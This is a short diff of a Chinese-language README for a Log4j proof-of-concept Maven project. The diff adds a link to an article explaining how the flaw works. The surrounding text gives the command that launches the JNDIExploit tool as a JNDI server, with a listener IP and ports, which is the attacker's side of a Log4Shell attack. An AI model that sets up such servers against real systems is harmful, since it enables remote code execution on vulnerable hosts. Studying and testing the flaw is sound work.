@@ -1,6 +1,8 @@
 # apache_log4j_poc
 apache log4j poc—— base Maven
 
+原理：[https://mp.weixin.qq.com/s/K74c1pTG6m5rKFuKaIYmPg](https://mp.weixin.qq.com/s/K74c1pTG6m5rKFuKaIYmPg)
+
 使用[JNDIExploit](https://github.com/feihong-cs/JNDIExploit)开启jndi服务器：
 ```
 java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.171.1 -l 12344 -p 9999 
